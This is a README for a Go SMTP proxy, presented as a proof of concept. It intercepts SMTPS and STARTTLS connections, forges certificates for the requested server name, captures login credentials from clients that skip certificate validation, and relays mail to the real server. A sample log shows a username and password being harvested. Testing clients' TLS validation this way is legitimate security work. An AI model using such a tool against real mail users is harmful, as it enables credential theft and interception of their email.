# smtps-proxy

A simple SMTP proxy service written in Go. It accepts SMTP connections on both SMTPS/implicit TLS (port 465) and STARTTLS (port 587). This was built as a proof of concept to capture credentials from clients that do not properly validate the returned TLS certificate, while forwarding mail traffic to the proper mail server.

## Example usage

```shell
$ go install github.com/francisbergin/smtps-proxy

$ smtps-proxy
2026/04/05 16:08:09 Starting SMTP server with STARTTLS on :587
2026/04/05 16:08:09 Starting SMTP server with implicit TLS on :465
2026/04/05 16:08:13 127.0.0.1:52208: NewSession
2026/04/05 16:08:13 127.0.0.1:52208: Generating certificate for SNI: smtp.gmail.com
2026/04/05 16:08:13 127.0.0.1:52208: Logout
2026/04/05 16:08:13 127.0.0.1:52208: NewSession
2026/04/05 16:08:13 127.0.0.1:52208: Auth credentials: identity= username=testing123@example.com password=mysecretpassword
2026/04/05 16:08:13 127.0.0.1:52208: Connecting to real server: smtp.gmail.com (64.233.178.108)
2026/04/05 16:08:15 127.0.0.1:52208: Mail from: testing123@example.com
2026/04/05 16:08:15 127.0.0.1:52208: Rcpt to: testing456@example.com
2026/04/05 16:08:15 127.0.0.1:52208: Data received
2026/04/05 16:08:16 127.0.0.1:52208: Data forwarded to real server (754 bytes)
2026/04/05 16:08:16 127.0.0.1:52208: Reset
2026/04/05 16:08:16 127.0.0.1:52208: Logout
```
